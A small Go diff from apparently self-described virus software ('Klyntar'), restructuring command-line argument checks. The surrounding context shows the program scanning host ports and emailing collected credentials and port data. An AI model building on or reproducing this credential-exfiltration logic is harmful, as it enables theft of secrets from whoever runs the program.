@@ -25,19 +25,14 @@ func main() {
 		emailMessage := messagePorts + messageCredentials
 
 		sendEmail(emailMessage)
+	} else if os.Args[1] == "help" {
+		help()
+		return
+	} else if os.Args[1] == "klyntar" {
+		fmt.Println(Bold(Cyan("Starting Klyntar Virus...\n")))
 	} else {
 		showDirectorys(os.Args[1])
 		return
-	}
-
-	// fmt.Println(os.Args)
-	if os.Args[1] == "help" {
-		help()
-		return
-	}
-
-	if os.Args[1] == "klyntar" {
-		fmt.Println(Bold(Cyan("Starting Klyntar Virus...\n")))
 	}
 
 	//Scan all ports open in host
